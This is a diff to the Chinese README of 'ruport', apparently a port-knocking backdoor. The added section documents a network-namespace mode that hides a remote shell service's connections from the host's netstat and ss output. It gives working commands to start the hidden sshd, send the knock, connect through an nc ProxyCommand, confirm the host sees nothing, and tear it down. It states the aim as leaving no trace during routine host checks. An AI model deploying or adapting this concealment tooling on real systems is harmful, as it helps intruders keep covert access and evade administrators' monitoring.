@@ -266,3 +266,42 @@ p2:     功能端口(被控端实际与控制端通讯的本地程序功能端�
 ```
 
 nc 反弹要求被控端程序同目录下存在 `nc` 可执行文件（与原版一致）。
+
+## netns 隐藏模式（宿主侧连接隐藏）
+
+默认模式下，改写后的连接在**宿主** `netstat -an` 中仍以真实四元组可见
+（`:22 ↔ 控制端:3333`）——TC 层 NAT 改变不了内核 socket 表。若要求宿主
+常规巡检也无痕，启用 netns 模式：隐藏服务运行在独立网络命名空间内，
+TC 升级为 L3+L4 NAT（目的/源 IP+端口一并改写），流量经 veth **纯转发**，
+宿主上不创建任何 socket。设计与边界详见
+[doc/design/01-netns-hidden-service.md](doc/design/01-netns-hidden-service.md)。
+
+```bash
+# 启动（netns 幂等创建：veth 10.0.0.1/24 ↔ 10.0.0.2/24，默认路由，
+# 自动关闭 veth TX 校验和卸载、打开 ip_forward）
+sudo ./ruport -i ens33 -N --exec "/usr/sbin/sshd -D -p 22"
+
+# 敲门与连接方式与默认模式完全一致（-y 仍为 ns 内服务端口）
+./c3 -t <服务器IP> -p 80 -1 -S <控制端IP> -P 3333 -x 80 -y 22
+ssh -o "ProxyCommand=nc -p 3333 %h %p" user@<服务器IP> -p 80
+
+# 验证：宿主 netstat -an | grep 3333 与 ss -tn | grep :22 均为空；
+# ns 内可见真实四元组：sudo ip netns exec ruport_ns ss -tn
+
+# 清理（可选；Ctrl+C 退出默认保留 netns 与会话连续）
+sudo ./ruport -ns-destroy
+```
+
+参数：`-N` 启用；`--ns-name`（默认 ruport_ns）；`--ns-subnet`（默认
+10.0.0.0/24，.1 网关 / .2 服务）；`--exec`（ns 内拉起的服务命令，空格
+切分不走 shell，须前台运行如 sshd 的 `-D`）；`--exec-detach`（服务不随
+ruport 退出）；`--ns-destroy`（销毁 netns/veth 后退出）。
+
+注意事项：
+
+- 不带 `-N` 启动时行为与传统模式完全一致（回退路径）；
+- 若宿主 iptables/nftables 的 FORWARD 链为 DROP，转发进 ns 的包会被丢
+  （启动时会打印提示），需自行放行 veth 转发；
+- 服务进程在宿主 `ps` 中仍可见、登录仍写 `/var/log/auth.log`——本模式
+  解决的是 netstat/ss 层面的可见性，不是完全隐形；
+- 原宿主 sshd 与 ns 内 sshd 可并存（协议栈隔离，端口不冲突）。
